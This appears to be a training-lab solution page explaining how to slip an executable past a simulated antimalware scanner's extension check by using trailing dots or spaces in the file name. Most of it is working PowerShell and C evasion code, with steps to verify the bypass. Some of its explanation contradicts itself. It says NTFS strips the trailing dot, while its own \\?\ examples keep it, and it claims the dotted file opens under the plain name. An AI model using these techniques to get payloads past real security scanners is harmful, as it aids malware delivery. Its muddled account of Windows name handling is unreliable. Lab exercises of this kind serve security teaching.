---
title: "Solution 27: Trailing Dots and Spaces (NTFS Normalization Bypass)"
challenge_number: 27
difficulty: medium
category: "Extension Heuristic Bypass"
permalink: /solutions/27-trailing-dots-spaces/
---

# Solution: Trailing Dots and Spaces (NTFS Normalization Bypass)

[Back to Challenge](../challenges/27-trailing-dots-spaces.md)

## Overview

Windows NTFS automatically strips trailing dots and spaces from filenames during standard file operations. If the scanner reads the raw filename string **before** NTFS normalization occurs, it may parse the extension incorrectly. A file named `payload.exe.` has its last dot followed by nothing — the scanner extracts an empty extension. But once written to disk, NTFS strips the trailing dot, and the actual file becomes `payload.exe`.

## Working Code

### Basic Trailing Dot Bypass

```powershell
# Standard file creation strips trailing dots automatically:
# "payload.exe." becomes "payload.exe" on disk
# But if the scanner checks the INPUT name before normalization...

# Method 1: Using \\?\ prefix to bypass Win32 normalization
$path = "\\?\$PWD\payload.exe."
[System.IO.File]::WriteAllText($path, "MZ payload content")

# Method 2: Multiple trailing dots
$path2 = "\\?\$PWD\payload.exe..."
[System.IO.File]::WriteAllText($path2, "MZ payload content")

# Method 3: Trailing spaces
$path3 = "\\?\$PWD\payload.exe   "
[System.IO.File]::WriteAllText($path3, "MZ payload content")
```

### How NTFS Normalization Works

```powershell
# Demonstration: Standard API strips trailing dots/spaces
$testContent = "test data"

# This creates "test.exe" (trailing dot stripped by Win32 subsystem)
Set-Content -Path "test.exe." -Value $testContent
Get-Item "test.exe"  # File exists!
# "test.exe." was normalized to "test.exe"

# Using \\?\ prefix PRESERVES trailing characters
$rawPath = "\\?\$PWD\weird.exe."
[System.IO.File]::WriteAllText($rawPath, $testContent)
# This file actually has the trailing dot on NTFS!

# The file can be accessed both ways:
[System.IO.File]::Exists("\\?\$PWD\weird.exe.")  # True (exact name)
Test-Path ".\weird.exe"                            # Also True (normalized)
```

### Exploiting Scanner Timing

```powershell
# Scenario: Scanner receives filename as command-line argument
# The filename string "payload.exe." is parsed BEFORE any file I/O

# What the scanner sees:
$inputName = "payload.exe."
$dotPos = $inputName.LastIndexOf('.')  # Position 11 (the TRAILING dot)
$ext = $inputName.Substring($dotPos + 1)  # "" (empty - nothing after trailing dot)
Write-Host "Scanner extracted extension: '$ext'"  # Empty string!

# What's actually on disk after NTFS normalization:
# "payload.exe" — a fully functional executable
```

### Trailing Spaces Variant

```powershell
# Trailing spaces also get stripped by NTFS
$inputName = "payload.exe   "
$dotPos = $inputName.LastIndexOf('.')
$ext = $inputName.Substring($dotPos + 1)  # "exe   " (with spaces)
$extLower = $ext.ToLower().Trim()  # After trim: "exe"
# BUT if scanner doesn't trim: "exe   " != "exe"

# Without trimming:
Write-Host "'exe   ' -eq 'exe': $("exe   " -eq "exe")"  # False!

# The scanner may or may not trim — if it doesn't, this bypasses
```

### Dot-Space Combination

```powershell
# Combining dots and spaces for maximum confusion
# "payload.exe . " — last dot is followed by space
$inputName = "payload.exe . "
$dotPos = $inputName.LastIndexOf('.')
$ext = $inputName.Substring($dotPos + 1)  # " " (just a space)
Write-Host "Extension: '$ext'"  # Space character — not in suspicious list

# After NTFS normalization, the actual file could be anything
```

### Using Raw Win32 API (C Example)

```c
// Create a file with trailing dot that NTFS won't strip
// Using the \\?\ prefix disables Win32 name processing

#include <windows.h>

int main() {
    // This creates a file literally named "payload.exe." on NTFS
    HANDLE hFile = CreateFileW(
        L"\\\\?\\C:\\temp\\payload.exe.",  // Raw path with trailing dot
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        const char* data = "MZ\x90\x00";  // PE header start
        DWORD written;
        WriteFile(hFile, data, 4, &written, NULL);
        CloseHandle(hFile);
    }

    // Access WITHOUT \\?\ prefix normalizes: opens "payload.exe"
    // Access WITH \\?\ prefix: opens "payload.exe." (the exact file)
    return 0;
}
```

### PowerShell P/Invoke Approach

```powershell
# Use P/Invoke to call CreateFileW with \\?\ prefix
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class NtfsRaw {
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr CreateFileW(
        string lpFileName, uint dwDesiredAccess,
        uint dwShareMode, IntPtr lpSecurityAttributes,
        uint dwCreationDisposition, uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(
        IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    public static void CreateWithTrailingDot(string dir, string filename, byte[] content) {
        string path = @"\\?\" + dir + @"\" + filename;
        IntPtr handle = CreateFileW(path, 0x40000000, 0, IntPtr.Zero, 2, 0x80, IntPtr.Zero);
        if (handle != (IntPtr)(-1)) {
            uint written;
            WriteFile(handle, content, (uint)content.Length, out written, IntPtr.Zero);
            CloseHandle(handle);
        }
    }
}
"@

# Create "payload.exe." (with literal trailing dot)
$content = [System.Text.Encoding]::ASCII.GetBytes("MZ executable content")
[NtfsRaw]::CreateWithTrailingDot($PWD.Path, "payload.exe.", $content)
```

## Why It Works

The scanner's extension logic:

```nim
let dotPos = filename.rfind('.')
let ext = filename[dotPos+1..^1].toLowerAscii()
```

For `payload.exe.` (trailing dot):
- `rfind('.')` finds the **last** dot — which is the trailing one at the end
- `filename[dotPos+1..^1]` extracts everything after that dot: `""` (empty)
- Empty string is not in the suspicious extensions list
- **No warning generated**

For `payload.exe   ` (trailing spaces):
- `rfind('.')` finds the dot before `exe   `
- Extracts: `"exe   "` (with trailing spaces)
- If not trimmed: `"exe   " != "exe"` — comparison fails
- **No warning generated** (if scanner doesn't trim)

The NTFS normalization then handles the rest:
- When the file is actually accessed/executed, Windows strips trailing dots/spaces
- `payload.exe.` → `payload.exe` (functional executable)
- The scanner saw a "safe" filename, but the OS executes a dangerous one

## How to Verify

1. Test the scanner's parsing behavior:
   ```powershell
   # Create a file and scan with trailing dot in the name argument
   Set-Content -Path "testpayload.exe" -Value "test"
   # If scanner accepts the filename string directly:
   nim_antimalware_sim.exe "testpayload.exe."
   ```

2. Expected result: If the scanner uses the raw input string, it extracts empty extension from the trailing dot → **no warning**.

3. Verify NTFS normalization:
   ```powershell
   # Prove that trailing dots get stripped
   Set-Content -Path "normalize_test.exe." -Value "test"
   Test-Path "normalize_test.exe"   # True — NTFS stripped the dot
   Get-Item "normalize_test.exe" | Select-Object Name
   # Name: normalize_test.exe
   ```

4. Test with \\?\ prefix for real trailing dot:
   ```powershell
   $path = "\\?\$PWD\real_trailing.exe."
   [System.IO.File]::WriteAllText($path, "content")
   # File literally has trailing dot on disk
   [System.IO.File]::Exists($path)  # True
   ```

5. Verify the timing gap matters:
   ```powershell
   # Scanner receives "file.exe." as argument → parses ext as ""
   # Scanner then opens "file.exe." → NTFS normalizes to "file.exe"
   # The file content is scanned, but the extension check already passed
   ```
